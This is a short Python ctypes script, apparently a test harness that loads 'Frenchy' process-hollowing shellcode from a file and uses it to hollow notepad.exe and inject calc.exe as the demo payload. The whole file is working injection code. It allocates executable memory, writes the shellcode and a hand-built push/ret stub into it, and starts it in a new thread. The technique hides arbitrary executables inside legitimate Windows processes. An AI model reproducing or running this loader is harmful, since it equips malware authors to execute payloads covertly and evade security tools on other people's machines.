from ctypes import *
import struct

f = open("frenchyshellcode.bin", "rb")
frenchy = f.read()
f.close()
f = open("c:\\windows\\system32\\calc.exe", "rb")
calc = f.read()
f.close()
hollowpath = "c:\\windows\\notepad.exe\x00"
#to test, full shellcode = frenchy + arguments for frenchy + code to jmp
lenshellcode = len(frenchy) + len(calc) + len(hollowpath) + len("\x68\x00\x00\x00\x00\x68\x78\x56\x34\x12\x68\x78\x56\x34\x12\x68\x78\x56\x34\x12\xc3")
ptr = windll.kernel32.VirtualAlloc(None, lenshellcode, 0x3000, 0x40)
shellcode = frenchy
shellcode += calc
shellcode += hollowpath
shellcode += "\x68" + struct.pack("<L", ptr + len(frenchy)) #push path to process to hollow
shellcode += "\x68" + struct.pack("<L", ptr + len(frenchy)+len(calc)) #push address of pe to inject
shellcode += "\x68\x00\x00\x00\x00" #fake ret addr
shellcode += "\x68" + struct.pack("<L", ptr) #push address of frenchy shellcode entry point
shellcode += "\xc3" #jmp to frenchy
hproc = windll.kernel32.OpenProcess(0x1F0FFF,False,windll.kernel32.GetCurrentProcessId())
windll.kernel32.WriteProcessMemory(hproc, ptr, shellcode, len(shellcode), byref(c_int(0)))
windll.kernel32.CreateThread(0,0,ptr+len(frenchy)+len(calc)+len(hollowpath),0,0,0)
windll.kernel32.WaitForSingleObject(c_int(-1), c_int(-1))